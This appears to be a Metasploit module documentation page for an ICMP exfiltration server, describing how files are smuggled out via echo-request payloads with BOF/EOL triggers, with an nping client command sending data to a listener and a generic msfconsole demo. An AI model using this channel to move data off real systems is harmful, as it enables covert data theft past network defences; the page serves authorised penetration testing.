## ICMP Exfiltration Service

This module is designed to provide a server-side component 
to receive and store files exfiltrated over ICMP echo 
request packets. To use this module you will need to send an 
initial ICMP echo request containing the specific start 
trigger (defaults to '^BOF') this can be followed by the 
filename being sent (or a random filename can be assisnged). 
All data received from this source will automatically be 
added to the receive buffer until an ICMP echo request 
containing a specific end trigger (defaults to '^EOL') is 
received. Suggested Client: Data can be sent from the client 
using a variety of tools. One such example is nping 
(included with the NMAP suite of tools) - usage: nping 
--icmp 10.0.0.1 --data-string "BOFtest.txt" -c1


## Module Name
auxiliary/server/icmp_exfil

## Authors
Chris John Riley


## References
* https://github.com/todb/packetfu
* http://nmap.org/book/nping-man.html
* http://blog.c22.cc/2012/02/17/quick-post-fun-with-python-ctypes-simpleicmp/




## Platforms


## Reliability
[Normal](https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking)

## Demo

```
msf > use auxiliary/server/icmp_exfil
msf auxiliary(icmp_exfil) > show targets
   ... a list of targets ...
msf auxiliary(icmp_exfil) > set TARGET <target-id>
msf auxiliary(icmp_exfil) > show options
   ... show and set options ...
msf auxiliary(icmp_exfil) > run
```
    
    